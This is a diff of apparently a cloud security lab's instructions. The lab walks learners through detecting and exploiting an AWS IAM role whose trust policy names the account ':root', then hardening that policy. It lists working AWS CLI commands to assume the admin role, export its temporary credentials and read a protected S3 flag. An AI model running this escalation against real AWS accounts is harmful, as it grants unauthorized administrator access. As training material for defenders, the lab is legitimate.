@@ -6,15 +6,9 @@
 
 **The Vulnerability:** `iamws-privileged-admin-role` has a trust policy that specifies `arn:aws:iam::ACCOUNT_ID:root` as the trusted principal. Despite looking like it restricts access to the root user, `:root` in a trust policy means any principal in the account with `sts:AssumeRole` permission can assume this role.
 
-**Real-world scenario:** An administrator creates a privileged role and sets the trust policy to the account root, thinking it restricts the role to a single privileged user. In practice, this grants every IAM user and role in the account the ability to become an administrator — the blast radius of a single compromised identity expands to full account takeover.
+**Real-world scenario:** The `Principal: { "AWS": "arn:aws:iam::ACCOUNT_ID:root" }` pattern is the AWS-recommended idiom for *cross-account* role delegation — the trusting account names the partner account's root, and the partner account's IAM admin gates which of their principals can actually call `sts:AssumeRole`. An engineer building same-account automation copies this snippet from AWS docs or an internal Terraform module and substitutes their own account ID. The trust policy now looks identical to the canonical cross-account example, but the second-layer gate is gone: inside a single account there is no separate IAM admin restricting who can assume. Every IAM user and role in the account with `sts:AssumeRole` permission can now become an administrator, and a single compromised low-privilege identity expands into full account takeover.
 
 ### Part A: Identify with iam-recon
-
-First, build or refresh your iam-recon graph:
-
-```bash
-iam-recon graph create --profile taractf
-```
 
 Run the privilege escalation preset to surface suspicious STS edges:
 
@@ -48,21 +42,26 @@ Expected output:
 ALLOW user/iamws-role-assumer-user can call sts:AssumeRole with arn:aws:iam::*:role/iamws-privileged-admin-role
 ```
 
-Cross-reference with pathfinding.cloud's known path database:
+Cross-reference with pathfinding.cloud's known path database. Use `--principal` to filter to just this identity instead of scrolling through every match in the graph:
 
 ```bash
-iam-recon --account $ACCOUNT_ID pathfinding
+iam-recon --account $ACCOUNT_ID pathfinding \
+  --principal user/iamws-role-assumer-user
 ```
 
-Look for the `[sts-001]` entry:
+Expected output:
 ```
-[sts-001] user/iamws-role-assumer-user (principal-access)
-    Path: sts:AssumeRole
-    Perms: sts:AssumeRole
+Pathfinding.cloud
+  Database: N known escalation paths bundled
+
+  user/iamws-role-assumer-user — 1 paths matched:
+
+  [sts-001] sts:AssumeRole (principal-access)
+    Permissions: sts:AssumeRole
     https://www.pathfinding.cloud/paths/sts-001
 ```
 
-**In the interactive visualization:** launch `iam-recon --account $ACCOUNT_ID visualize --interactive-viz` (the port is dynamic — watch for `Interactive visualization available at: http://127.0.0.1:<port>` in the terminal). Search for `role-assumer-user`. You'll see an orange node with an **STS** edge leading to the red admin role. Click the STS edge — iam-recon displays the trust policy inline, showing `:root` as the trusted principal.
+**In the interactive visualization:** Search for `role-assumer-user`. You'll see an orange node with an **STS** edge leading to the red admin role. Click the red admin role and click the box labeled `role/iamws-privileged-admin-role-trust` — `iam-recon` displays the trust policy inline, showing `:root` as the trusted principal.
 
 ### Part B: Understand the Attack
 
@@ -74,15 +73,15 @@ Visit [pathfinding.cloud/paths/sts-001](https://pathfinding.cloud/paths/sts-001)
 - **Impact:** Any principal in the account can assume an admin-tier role
 
 > [!NOTE]
-> The vulnerability is **not** in the attacker's `sts:AssumeRole` permission — it's in the **target role's trust policy**. Trust policies are resource policies attached to the role itself. They control who can assume the role, independent of what the caller's identity policy allows.
+> This attack requires two things: 
+> 1. The starting user/role must have permission to do the `sts:AssumeRole` action and 
+>2. The **target role's trust policy** must allow the starting user/role to assume the role. Remember that trust policies are resource policies attached to the role itself. They control who can assume the role, independent of what the caller's identity policy allows.
 
 ### Part C: Exploit the Vulnerability
 
 **Step 1: Confirm your low-privilege identity**
 
 ```bash
-ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text \
-  --profile iamws-role-assumer-user)
 aws sts get-caller-identity --profile iamws-role-assumer-user
 ```
 
@@ -95,9 +94,26 @@ Expected output:
 }
 ```
 
-You're operating as a low-privilege user with no direct access to sensitive resources.
+You're operating as the `iamws-role-assumer-user` IAM user.
 
-**Step 2: Inspect the vulnerable trust policy**
+**Step 2: Try the crown jewels directly — you're denied**
+
+```bash
+aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt - \
+  --profile iamws-role-assumer-user
+```
+
+Expected output:
+```
+fatal error: An error occurred (403) when calling the HeadObject operation: Forbidden
+```
+
+The `iamws-role-assumer-user` can't reach the crown jewels directly, but you learned from `iam-recon` that `iamws-role-assumer-user` has a path to `iamws-privileged-admin-role` via `sts:AssumeRole`. You will exploit this path to get access to the crown jewels.
+
+**Step 3 (Optional): Inspect the vulnerable trust policy via the AWS CLI**
+
+You can use the AWS CLI to inspect the target role trust policy just as you did in `iam-recon`. The `:root` principal is the smoking gun — this role trusts the entire account.
+
 
 ```bash
 aws iam get-role --role-name iamws-privileged-admin-role \
@@ -117,23 +133,9 @@ Expected output:
 }
 ```
 
-The `:root` principal is the smoking gun — this role trusts the entire account.
-
-**Step 3: Try the crown jewels directly — you're denied**
-
-```bash
-aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt - \
-  --profile iamws-role-assumer-user
-```
-
-Expected output:
-```
-fatal error: An error occurred (403) when calling the HeadObject operation: Forbidden
-```
-
-The user can't reach the crown jewels directly. Time to use the permissive trust policy.
-
 **Step 4: Assume the privileged admin role**
+
+Run the following command to use `sts:AssumeRole` to return credentials for a session with `iamws-privileged-admin-role`.
 
 ```bash
 ADMIN_CREDS=$(aws sts assume-role \
@@ -141,15 +143,25 @@ ADMIN_CREDS=$(aws sts assume-role \
   --role-session-name escalated \
   --query "Credentials" --output json \
   --profile iamws-role-assumer-user)
+```
 
+You can echo $ADMIN_CREDS to understand what `sts:AssumeRole` returned.
+
+```
+echo $ADMIN_CREDS
+```
+
+Configure local environment variables with the temporary credentials, this will authenticate the AWS CLI as the `iamws-privileged-admin-role` for future commands.
+
+```
 export AWS_ACCESS_KEY_ID=$(echo $ADMIN_CREDS | jq -r '.AccessKeyId')
 export AWS_SECRET_ACCESS_KEY=$(echo $ADMIN_CREDS | jq -r '.SecretAccessKey')
 export AWS_SESSION_TOKEN=$(echo $ADMIN_CREDS | jq -r '.SessionToken')
 ```
 
-No error — the permissive trust policy allows any account principal to assume this admin role.
-
 **Step 5: Claim the crown jewels with elevated credentials**
+
+Confirm you are now running AWS commands as the `iamws-privileged-admin-role`
 
 ```bash
 aws sts get-caller-identity
@@ -164,33 +176,34 @@ Expected output:
 }
 ```
 
+> [!NOTE]
+> `escalated` is the role session name. You named the session earlier in step 4 when you ran the `assume-role` command with the `--role-session-name` argument.
+
+Try to access the crowned jewels again.
+
 ```bash
 aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt -
 ```
 
-The file contents appear — you now hold `AdministratorAccess`.
-
-**Step 6: Clean up the escalated session**
-
-```bash
-unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
-aws sts get-caller-identity   # confirm you're back to iamws-role-assumer-user
-```
+The file contents appear — you escalated to a role with `AdministratorAccess` and can access the sensitive files!
 
 ### Part D: Apply the Defense
 
-Run all defense steps as your admin identity (not as `iamws-role-assumer-user`).
-
-**Step 1: Inspect the current vulnerable trust policy**
+**Step 1: Clean up the escalated session**
 
 ```bash
-aws iam get-role --role-name iamws-privileged-admin-role \
-  --query 'Role.AssumeRolePolicyDocument' --output json
+unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN  
 ```
 
-You'll see the same `:root` principal you just exploited.
+Confirm you're back to iamws-role-assumer-user.
 
-**Step 2: Harden — replace `:root` with a specific principal and add an MFA condition**
+```
+aws sts get-caller-identity 
+```
+
+Run all defense steps as your admin identity (not as `iamws-role-assumer-user`).
+
+**Step 2: Harden — replace `:root` with a specific principal**
 
 ```bash
 ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
@@ -203,17 +216,13 @@ aws iam update-assume-role-policy \
     "Statement": [{
       "Effect": "Allow",
       "Principal": {"AWS": "'$ADMIN_ROLE_ARN'"},
-      "Action": "sts:AssumeRole",
-      "Condition": {"Bool": {"aws:MultiFactorAuthPresent": "true"}}
+      "Action": "sts:AssumeRole"
     }]
   }'
 ```
 
 What this changes:
 1. **Specific principal:** Only your admin identity can assume the role — eliminates the `:root` vulnerability.
-1. **MFA condition:** Requires MFA — sensitive roles should require strong authentication.
-
-> 🚧 **Kiro lab integration point — see Andrew.** A guided Kiro walkthrough for authoring the hardened trust policy slots in here.
 
 ### Part E: Verify the Remediation
 
@@ -250,10 +259,15 @@ fatal error: An error occurred (403) when calling the HeadObject operation: Forb
 
 **Step 3: Verify with iam-recon**
 
-Refresh the graph and re-run the privesc preset:
+Refresh the `iam-recon` graph.
 
 ```bash
-iam-recon graph create --profile taractf
+iam-recon graph create --profile iamws-lab-default
+```
+
+Re-run the privesc preset.
+
+```bash
 iam-recon --account $ACCOUNT_ID argquery --preset privesc
 ```
 
@@ -264,20 +278,9 @@ The `user/iamws-role-assumer-user -> STS role/iamws-privileged-admin-role` line 
 
 **In the interactive visualization:** search for `privileged-admin-role`. The STS edge between `iamws-role-assumer-user` and `iamws-privileged-admin-role` is gone. Click the role node — the inspect panel shows `iamws-privileged-admin-role-trust` under **TRUST** (clickable). Note: iam-recon's viz flags this trust policy as "1 RISK" even after hardening — this is cosmetic; the absent STS edge is the authoritative signal.
 
-![Post-defense trust panel](.playwright-mcp/scenario-2-postdefense-trust-panel.png)
-
 ### What You Learned
 
+- How to escalate privileges from a lesser priviledged IAM user to a priviledged Admin role
 - Trust policies that specify `:root` trust every principal in the account — not just the AWS root user.
-- The vulnerability is in the **resource policy** (trust policy) attached to the role itself, not in the caller's identity policy.
-- Always use **specific principal ARNs** in trust policies; add **condition keys** (like `aws:MultiFactorAuthPresent`) for defense in depth on sensitive roles.
-- iam-recon's `argquery --preset privesc` correctly reflects trust-policy changes because its STS edge checker evaluates trust policies. Per-action `argquery --principal` queries check identity policies only — they are not reliable for verifying trust-policy-based defenses.
-- `aws:MultiFactorAuthPresent` works for long-term IAM users; federated SSO sessions need different condition keys (e.g., `aws:PrincipalTag/...`).
-
-### Cleanup
-
-See [`cleanup.md`](cleanup.md) for revert steps before moving to the next scenario.
-
----
-
-**Next:** [Scenario 3: PassRole + EC2](../scenario-3-passrole-ec2/instructions.md) — Privilege escalation via new PassRole to an EC2 instance profile
+- For `sts:AssumeRole` to work, the starting identity must have `sts:AssumeRole` permissions and the target role must have a trust policy that includes the starting identity as a principal
+- Any principal that can assume an IAM role can use the full set of permissions attached to that role.
